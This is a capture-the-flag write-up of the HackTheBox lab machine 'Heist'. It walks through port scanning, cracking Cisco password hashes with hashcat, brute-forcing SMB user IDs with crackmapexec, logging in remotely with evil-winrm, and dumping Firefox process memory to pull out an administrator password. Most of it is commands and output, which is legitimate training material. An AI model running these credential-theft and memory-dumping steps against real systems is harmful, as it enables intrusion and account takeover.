# Heist

### Start with nmap

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```


### web 

We can see that in `http://10.10.10.149/attachments/config.txt` there is a security password that we can try and crakc using `hashcat`

`hashcat -m 500 hashlab2.txt /usr/share/wordlists/rockyou.txt`

```
$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent              
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: $1$pdQG$o8nrSzsGXeaduXrjlvKc91
Time.Started.....: Wed Nov  1 12:39:45 2023 (3 mins, 5 secs)
Time.Estimated...: Wed Nov  1 12:42:50 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    19127 H/s (5.98ms) @ Accel:256 Loops:125 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3544064/14344385 (24.71%)
Rejected.........: 0/3544064 (0.00%)
Restore.Point....: 3543040/14344385 (24.70%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:875-1000
Candidate.Engine.: Device Generator
Candidates.#1....: steauara -> std66984
```

We then try to use `crackmapexec` to check other users

`crackmapexec smb 10.10.10.149 -u 'hazard' -p 'stealth1agent' --rid-brute`

```
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
SMB         10.10.10.149    445    SUPPORTDESK      [+] Brute forcing RIDs
SMB         10.10.10.149    445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)
SMB         10.10.10.149    445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
SMB         10.10.10.149    445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)
```

We can clean this up adding `grep` and `sed`

`crackmapexec smb 10.10.10.149 -u 'hazard' -p 'stealth1agent' --rid-brute |grep -oE 'SUPPORTDESK\\([[:alnum:]]+) \(SidTypeUser\)'| sed -e 's/SUPPORTDESK\\\(.*\) (SidTypeUser)/\1/'`

```
Administrator
Guest
DefaultAccount
WDAGUtilityAccount
Hazard
support
Chase
Jason
```

We can find hashes inside `/attachments/config.txt`

```
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
```

We can use an online tool to decrypt  the Cisco type 7

```
stealth1agent
$uperP@ssword
Q4)sJu\Y8qz*A3?d
```

We then use `evil-winrm` to connect to the machine, by trying bunch of credentials, we got a hit

`Chase:Q4)sJu\Y8qz*A3?d`

We then run `get-process firefox` to check if this is the browser that is being used.

```
*Evil-WinRM* PS C:\users\chase\appdata\local\temp> get-process firefox

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1055      72   157136     232848       6.44   6188   1 firefox
    347      19    10196      39560       0.33   6300   1 firefox
    401      34    35104      92848       1.28   6420   1 firefox
    378      28    22608      59400       0.64   6728   1 firefox
    355      25    16504      38912       0.09   6992   1 firefox
```

We will send a tool called `Out-Minidump.ps1`

```
get-process -id 6188 | Out-Minidump
```

It will then create a firefox dump

```
*Evil-WinRM* PS C:\users\chase\appdata\local\temp> get-process -id 6188 | Out-Minidump


    Directory: C:\users\chase\appdata\local\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/2/2023   1:55 AM      525659519 firefox_6188.dmp
```

We then download it to our machine.

It will be a big file so we need to grep and find an interesting line

`cat firefox_6188.dmp | grep -aoE 'login_username=.{1,20}@.{1,20}&login_password=.{1,60}&login=.{1,60}'`

```
└─# cat firefox_6188.dmp | grep -aoE 'login_username=.{1,20}@.{1,20}&login_password=.{1,60}&login=.{1,60}'
login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=G
login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```

We will then check if it matches the sha256 that we found

```
┌──(root㉿kali)-[/home/kali/HTB/Intro-to-Dante]
└─# cat sha256hash.txt                                                                                    
91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040
                                                                                                                    
┌──(root㉿kali)-[/home/kali/HTB/Intro-to-Dante]
└─# echo -n '4dD!5}x/re8]FBuZ' | sha256sum
91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040  -
```

It matches!

We then use `Evil-Winrm` again to login as `Administrator`

```
evil-winrm -i 10.10.10.149 -u Administrator -p '4dD!5}x/re8]FBuZ'
```

Success!

We can then get our root.txt

